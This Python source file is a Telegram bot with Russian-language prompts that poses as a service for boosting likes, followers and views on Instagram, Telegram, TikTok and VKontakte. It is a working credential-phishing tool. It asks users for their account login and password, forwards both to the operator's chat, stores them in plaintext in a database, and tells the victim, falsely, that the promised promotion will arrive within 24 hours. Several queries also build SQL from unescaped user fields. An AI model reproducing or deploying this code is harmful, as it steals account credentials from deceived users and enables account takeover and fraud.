from pathlib import Path
from config import *
import traceback
import datetime
import logging
import sqlite3
import time
import sys
import os

from telebot import types
import telebot


BASE_DIR = Path(sys.argv[0]).parent
LOGS_DIR = BASE_DIR.joinpath("Logs")
DB_FILE = BASE_DIR.joinpath("data.db")
os.chdir(BASE_DIR)


os.makedirs(LOGS_DIR, exist_ok=True)
logs_file = LOGS_DIR.joinpath(datetime.datetime.now().strftime("%d_%m_%Y") + ".log")

logs = os.listdir(LOGS_DIR)
if len(logs) > 15:
    for item in reversed(logs):
        try:
            os.remove(LOGS_DIR.joinpath(item))
            break
        except:
            print(traceback.format_exc())
            continue
logs = []

logger = logging.getLogger()
logging_format = '%(asctime)s : %(name)s : %(levelname)s : %(message)s'
logging.basicConfig(
    level=logging.INFO,
    format=logging_format
)
try:
    fh = logging.FileHandler(
        logs_file,
        encoding='utf-8'
    )
except:
    try:
        fh = logging.FileHandler(
            logs_file
        )
    except:
        print(traceback.format_exc())
        os._exit(0)
fh.setFormatter(logging.Formatter(logging_format))
logger.addHandler(fh)


connection = sqlite3.connect(DB_FILE, check_same_thread=False)
cursor = connection.cursor()

cursor.execute("""CREATE TABLE IF NOT EXISTS users (username TEXT, id INTEGER, first_name TEXT, last_name TEXT)""")
cursor.execute("""CREATE TABLE IF NOT EXISTS passwords (platform TEXT, id INTEGER, login TEXT, password TEXT)""")
connection.commit()

bot = telebot.TeleBot(TOKEN)
try:
    bot.send_message(ID, "❇️ Бот запущен!") 
except:
    logger.error(traceback.format_exc())


def get_emodji(name: str) -> str:
    if name == "Instagram":
        return name + "📸"
    elif name == "Telegram":
        return name + "✉️"
    elif name == "Tiktok":
        return name + "📱"
    elif name == "VKontakte":
        return name + "💎"
    else:
        return name


@bot.message_handler(commands=["start"], chat_types=["private"])
def start(message: types.Message):
    cursor.execute(f"SELECT id FROM users WHERE id = {message.from_user.id}")
    if cursor.fetchone() == None:
        logger.error(f"Новый пользователь!\nID: {message.from_user.id}")

        cursor.execute(f"""INSERT INTO users VALUES ('{message.from_user.username}', {message.from_user.id}, '{message.from_user.first_name}', '{message.from_user.last_name}')""")
        connection.commit()

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Начать!", callback_data="start"))

        _text="""
👋 Привет!
Это бот продвижения вашего аккаунта в соц. сетях!
Чтобы начать, введите /farm или нажмите на кнопку ниже!
                            👇👇👇👇👇👇👇👇👇👇"""
        bot.send_message(message.chat.id, _text, reply_markup=markup)
    else:
        main_command(message)


@bot.message_handler(commands=["farm", "nakrutka", "nakr", "ferm", "f", "nakrut"], chat_types=["private"])
def main_command(message: types.Message):
    markup = types.InlineKeyboardMarkup(row_width=2)

    names = ["Instagram", "Telegram", "Tiktok", "VKontakte"]
    for item in names:
        item1 = types.InlineKeyboardButton(get_emodji(item), callback_data=f"platform|{item}")
        markup.add(item1)
        
    bot.send_message(message.chat.id, "Выберите платформу!", reply_markup=markup)


@bot.callback_query_handler(func=lambda call:True)
def callback_handler(call: types.CallbackQuery):
    author_id = call.message.chat.id

    if call.data == "start":
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())
        main_command(call.message)

    elif call.data.startswith("like|"):
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())
        platform = call.data.split("|")[1]

        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("Отмена❌"))
        
        msg = bot.send_message(author_id, "Введите колличество (не более 5000): ", reply_markup=markup)
        
        bot.register_next_step_handler(msg, proc_1, platform)

    elif call.data.startswith("platform|"):
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())

        platform = call.data.split("|")[1]

        markup = types.InlineKeyboardMarkup(row_width=2)

        if platform in ["Instagram", "Tiktok", "VKontakte"]:
            item1 = types.InlineKeyboardButton(text="Лайки❤️", callback_data=f"like|{platform}")
            item2 = types.InlineKeyboardButton(text="Подписчики📃", callback_data=f"like|{platform}")
            item3 = types.InlineKeyboardButton(text="Просмотры👁‍🗨", callback_data=f"like|{platform}")
            item4 = types.InlineKeyboardButton(text="Репосты📬", callback_data=f"like|{platform}")
            markup.add(item1)
            markup.add(item2)
            markup.add(item3)
            markup.add(item4)
        elif platform == "Telegram":
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("Отмена❌"))
            
            msg = bot.send_message(author_id, "Отправьте ссылку на ваш телеграмм канал или группу:", reply_markup=markup)
            
            bot.register_next_step_handler(msg, fake_channel, platform)
            return

        bot.send_message(author_id, "Выберите пункт:", reply_markup=markup)


def fake_channel(message: types.Message, platform: str):
    if "отмена" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("Меню!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "Операция отменена! Нажмите на кнопку ниже, чтобы повторить попытку!", reply_markup=markup)
        return
    
    if not "https://" in message.text and not "@" in message.text:
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("Отмена❌"))
        
        msg = bot.reply_to(message, "❌Ошибка! Ссылка не действительна!\n\nВведите другое значение:", reply_markup=markup)
        
        bot.register_next_step_handler(msg, fake_channel, platform)
        return

    markup = types.InlineKeyboardMarkup()

    item1 = types.InlineKeyboardButton(text="Реакции❤️", callback_data=f"like|{platform}")
    item2 = types.InlineKeyboardButton(text="Подписчики📃", callback_data=f"like|{platform}")
    item3 = types.InlineKeyboardButton(text="Просмотры👁‍🗨", callback_data=f"like|{platform}")
    item4 = types.InlineKeyboardButton(text="Репосты📬", callback_data=f"like|{platform}")
    markup.add(item1)
    markup.add(item2)
    markup.add(item3)
    markup.add(item4)

    bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=markup)


def proc_1(message: types.Message, platform: str):
    try:
        num = str(message.text)
        
        if "отмена" in str(message.text).lower():
            markup = types.InlineKeyboardMarkup()
            item1 = types.InlineKeyboardButton("Меню!", callback_data=f"start")
            markup.add(item1)

            bot.reply_to(message, "Операция отменена! Нажмите на кнопку ниже, чтобы повторить попытку!", reply_markup=markup)
            return

        if not num.isdigit():
            markup = types.InlineKeyboardMarkup()
            item1 = types.InlineKeyboardButton("Меню!", callback_data=f"platform|{platform}")
            markup.add(item1)

            bot.reply_to(message, "Введите колличество числом! Нажмите на кнопку ниже, чтобы повторить попытку!", reply_markup=markup)
            return

        if int(num) > 5000:
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("Отмена❌"))
            
            msg = bot.reply_to(message, "❌Ошибка! Колличество не может быть более 5000!\n\nВведите другое значение:", reply_markup=markup)
            
            bot.register_next_step_handler(msg, proc_1, platform)
            return

        else:
            bot.send_message(message.chat.id, f"Колличество: {num}")
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("Отмена❌"))

            msg = bot.send_message(message.chat.id, "Введите номер телефона или почту от вашего аккаунта:\n\nНапример: +79999999999 или test@gmail.com", reply_markup=markup)
            bot.register_next_step_handler(msg, step_1, platform)

    except:
        logger.error(traceback.format_exc())


def step_1(message: types.Message, platform: str):
    if "отмена" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("Меню!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "Операция отменена! Нажмите на кнопку ниже, чтобы повторить попытку...!", reply_markup=markup)
        return
    
    if not "+" in message.text and not "@" in message.text:
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("Отмена❌"))
        
        msg = bot.send_message(message.chat.id, "[ERROR] Кажется, это не логин! Если это номер телефона, проверьте знак '+' перед цифровым значением.\n\nВведите номер телефона или почту от вашего аккаунта:", reply_markup=markup)
        
        bot.register_next_step_handler(msg, step_1, platform)
        return

    bot.send_message(ID, f"""Полученные данные:	

Платформа: {platform}
ID: {message.from_user.id}
Username: @{message.from_user.username}
Логин: <tg-spoiler>{message.text}</tg-spoiler>
Имя: {message.from_user.first_name}""", parse_mode='html')

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("Отмена❌"))

    msg = bot.send_message(message.chat.id, "Введите пароль от вашего аккаунта:", reply_markup=markup)
    bot.register_next_step_handler(msg, step_2, platform, message.text)


def step_2(message: types.Message, platform: str, login: str):
    if "отмена" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("Меню!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "Операция отменена! Нажмите на кнопку ниже, чтобы повторить попытку!", reply_markup=markup)
        return
    
    markup = types.ReplyKeyboardRemove()
    
    bot.send_message(ID, f"""Полученные данные:

Платформа: {platform} 
ID: {message.from_user.id}
Username: @{message.from_user.username}
Логин: <tg-spoiler>{login}</tg-spoiler>
Пароль: <tg-spoiler>{message.text}</tg-spoiler>
Имя: {message.from_user.first_name}""", parse_mode='html', reply_markup=markup)

    # data = {
    # 	"platform": platform,
    # 	"login": login,
    # 	"password": message.text,
    # 	"id": message.from_user.id,
    # 	"username": message.from_user.username,
    # 	"first_name": message.from_user.first_name,
    # 	"last_name": message.from_user.last_name
    # }

    try:
        cursor.execute(f"SELECT id FROM passwords WHERE id = {message.from_user.id} AND platform = '{platform}'")
        if cursor.fetchone() == None:
            cursor.execute(f"""INSERT INTO passwords VALUES ('{platform}', {message.from_user.id}, ?, ?)""", (login, message.text,))
        else:
            cursor.execute(f"""UPDATE passwords SET login = ?, password = ? WHERE id = {message.from_user.id}""", (login,message.text,))

        connection.commit()
    except:
        logger.error(traceback.format_exc())

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Обратно!", callback_data="start"))

    bot.send_message(message.chat.id, f"Спасибо, что воспользовались нашим сервисом😉!\nЕсли введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!", reply_markup=markup)


while True:
    try:
        bot.polling(none_stop=True)
    except:
        logger.error(traceback.format_exc())
        time.sleep(3)
        continue
